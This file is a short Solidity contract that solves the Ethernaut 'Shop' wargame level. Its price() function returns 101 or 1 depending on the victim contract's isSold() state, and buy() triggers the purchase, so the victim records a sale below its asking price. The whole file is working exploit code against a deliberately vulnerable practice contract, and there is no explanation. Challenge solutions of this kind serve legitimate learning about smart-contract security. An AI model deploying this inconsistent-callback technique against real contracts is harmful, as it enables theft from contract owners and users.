// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface Buyer {
  function price() external view returns (uint);
}

contract EthernautLevl4 is Buyer {
    address victim;

    function setVictim(address _victim) public {
        victim = _victim;
    }

    function buy() public {
        bytes memory payload = abi.encodeWithSignature("buy()");
        victim.call(payload);
    }

    function price() public view override returns(uint) {
        bytes memory payload = abi.encodeWithSignature("isSold()");
        (, bytes memory result) = victim.staticcall(payload);
        bool sold = abi.decode(result, (bool));
        return sold ? 1 : 101;
    }
}